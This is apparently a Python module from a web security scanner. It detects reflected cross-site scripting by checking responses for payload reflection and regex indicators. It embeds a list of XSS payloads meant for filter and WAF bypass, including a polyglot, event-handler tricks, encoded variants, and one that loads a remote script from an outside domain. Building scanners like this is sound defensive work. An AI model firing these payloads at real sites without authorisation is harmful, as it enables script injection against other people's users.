"""
VORTEX XSS Scanner - V17.0 ULTIMATE
Heuristic XSS (Cross-Site Scripting) detection

DETECTION METHOD:
- Reflected XSS
- Payload reflection analysis
- HTML/JavaScript context detection

EVIDENCE LEVEL: HEURISTIC_ONLY
"""

import re
import logging
from typing import List, Dict, Any
from html import unescape

from domain.enums import FindingType
from core.network import HTTPResponse
from scanners.base import BaseScanner
from core.payloads.manager import get_payload_manager, PayloadType

logger = logging.getLogger(__name__)


class XSSScanner(BaseScanner):
    """
    XSS vulnerability scanner.
    
    Detects XSS through:
    - Payload reflection in response
    - Script execution context
    - HTML tag injection
    """
    
    def __init__(self):
        super().__init__(FindingType.XSS_REFLECTED)
        self.payload_manager = get_payload_manager()
        
        # XSS detection patterns
        self.xss_indicators = [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'onerror\s*=',
            r'onload\s*=',
            r'onclick\s*=',
            r'<img[^>]*>',
            r'<iframe[^>]*>'
        ]
        
        self.compiled_patterns = [
            re.compile(pattern, re.IGNORECASE | re.DOTALL) 
            for pattern in self.xss_indicators
        ]
    
    async def scan(self, url: str, parameter: str = 'q', **kwargs) -> List:
        """Scan URL for XSS."""
        logger.info(f"Starting XSS scan: {url}")
        
        payloads = self.generate_payloads()
        self.stats['payloads_generated'] += len(payloads)
        
        findings = await self.execute_scan(url, parameter, payloads)
        
        logger.info(f"XSS scan complete: {len(findings)} findings")
        return findings
    
    def generate_payloads(self, **kwargs) -> List[str]:
        """Generate XSS test payloads using PayloadManager."""
        return self.payload_manager.get_payloads(
            attack_type=PayloadType.XSS,
            technologies=kwargs.get('technologies', [])
        )
    
    def analyze_response(self, response: HTTPResponse, payload: str) -> Dict[str, Any]:
        """Analyze response for XSS indicators."""
        detected = False
        confidence = 0.0
        evidence_parts = []
        matched_patterns = []
        
        # Normalize payload and response for comparison
        normalized_payload = unescape(payload).lower()
        response_lower = response.body.lower()
        
        # Check for payload reflection
        if normalized_payload in response_lower or payload.lower() in response_lower:
            detected = True
            confidence += 0.5
            evidence_parts.append("Payload reflected in response")
            
            # Check if reflected in dangerous context
            for i, pattern in enumerate(self.compiled_patterns):
                if pattern.search(response.body):
                    matched_patterns.append(self.xss_indicators[i])
                    confidence += 0.2
                    evidence_parts.append(f"Reflected in executable context: {self.xss_indicators[i]}")
        
        # Check for XSS indicators even without exact reflection
        for i, pattern in enumerate(self.compiled_patterns):
            # Check if payload patterns appear in response
            if pattern.search(response.body):
                # Verify it's related to our payload
                match = pattern.search(response.body)
                if match:
                    matched_text = match.group(0)
                    # Simple heuristic: check if matched text is similar to payload
                    if any(part in matched_text.lower() for part in payload.lower().split()):
                        detected = True
                        confidence += 0.3
                        evidence_parts.append(f"XSS pattern detected: {matched_text[:50]}...")
        
        # Cap at 0.95 for heuristic
        confidence = min(confidence, 0.95)
        
        if detected:
            evidence = f"XSS indicators detected:\n"
            evidence += "\n".join(f"- {part}" for part in evidence_parts)
            if matched_patterns:
                evidence += f"\nMatched patterns: {', '.join(matched_patterns[:3])}"
        else:
            evidence = "No XSS indicators detected"
        
        return {
            'detected': detected,
            'confidence': confidence,
            'evidence': evidence,
            'matched_patterns': matched_patterns,
            'payload_reflected': normalized_payload in response_lower
        }
    
    # === Advanced Payload Generation (V17.0) ===
    
    ADVANCED_PAYLOADS = [
        # DOM-based XSS
        '"><img src=x onerror=alert(document.domain)>',
        "'-alert(1)-'",
        '<svg/onload=alert(String.fromCharCode(88,83,83))>',
        '{{constructor.constructor("return this")().alert(1)}}',
        # Polyglot payloads
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
        # Event handler variants
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        # Encoding bypass
        '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        # Template injection to XSS
        '${alert(1)}',
        '{{7*7}}',
        # Filter bypass techniques
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<SCRIPT SRC=//xss.rocks/xss.js></SCRIPT>',
        '<body/onhashchange=alert(1)>',
    ]
    
    def get_advanced_payloads(self) -> List[str]:
        """Get advanced XSS payloads for WAF bypass scenarios."""
        base_payloads = self.generate_payloads()
        return base_payloads + self.ADVANCED_PAYLOADS